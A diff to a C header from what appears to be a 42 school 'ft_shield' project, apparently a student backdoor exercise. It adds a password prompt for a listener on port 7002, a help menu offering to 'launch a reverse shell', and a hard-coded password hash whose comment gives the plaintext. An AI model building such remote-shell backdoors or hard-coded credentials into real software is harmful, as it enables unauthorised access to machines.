@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/21 13:30:07 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/21 14:30:10 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -23,15 +23,22 @@
 # define TEXT_RED "\033[31m"
 # define TEXT_GREEN "\033[32m"
 # define TEXT_YELLOW "\033[33m"
+# define TEXT_BLUE "\033[36m"
 # define TEXT_BOLD "\033[1m"
 # define TEXT_RESET "\033[0m"
-# define PASSWORD_PROMPT_TEXT TEXT_YELLOW TEXT_BOLD "Please provide the password.\n" TEXT_RESET
-# define INCORRECT_PASSWORD_TEXT TEXT_RED TEXT_BOLD "Incorrect password!\n" TEXT_RESET
-# define CORRECT_PASSWORD_TEXT TEXT_GREEN TEXT_BOLD "Correct password, welcome in!\n" TEXT_RESET
+
+# define PASSWORD_PROMPT_TEXT		TEXT_YELLOW	TEXT_BOLD "Please enter the password to connect.\n"												TEXT_RESET
+# define INCORRECT_PASSWORD_TEXT	TEXT_RED	TEXT_BOLD "Incorrect password!\n"																TEXT_RESET
+# define CORRECT_PASSWORD_TEXT		TEXT_GREEN	TEXT_BOLD "Correct password, welcome in!\n" TEXT_BLUE "Write \'help\' for more information\n"	TEXT_RESET
+# define WELCOME_TEXT				TEXT_BLUE	TEXT_BOLD "Welcome to ft_shield!\n"																TEXT_RESET
+# define HELP_TEXT					TEXT_BLUE	TEXT_BOLD "shell: launch a reverse shell\nhelp: see this\n"										TEXT_RESET
+# define RVRS_SHELL_TEXT			TEXT_BLUE	TEXT_BOLD "Launching reverse shell.\n"															TEXT_RESET
+
 # define LOWERCASE_HEXA "0123456789abcdef"
 # define SERVER_PORT 7002
 
-# define PASSWORD "3c72631c6e15250756383845e3987864" // 1234
+# define PASSWORD "c2b9ce9e110fe946e9bf5e63becb6e70" // mbatty42
+# define LOGIN_42 "mbatty"
 
 typedef enum e_log_type
 {
